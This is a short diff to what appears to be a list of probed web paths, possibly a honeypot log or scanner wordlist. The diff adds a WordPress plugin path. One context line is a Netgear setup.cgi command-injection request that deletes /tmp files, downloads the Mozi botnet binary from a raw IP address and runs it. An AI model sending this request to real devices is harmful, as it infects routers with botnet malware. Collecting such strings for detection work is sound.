@@ -2253,3 +2253,4 @@ google.com:443
 /system/logs/error.txt
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.255.56:36375/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /_profiler/empty/search/results
+/wp-content/plugins/cleantalk-spam-protect/
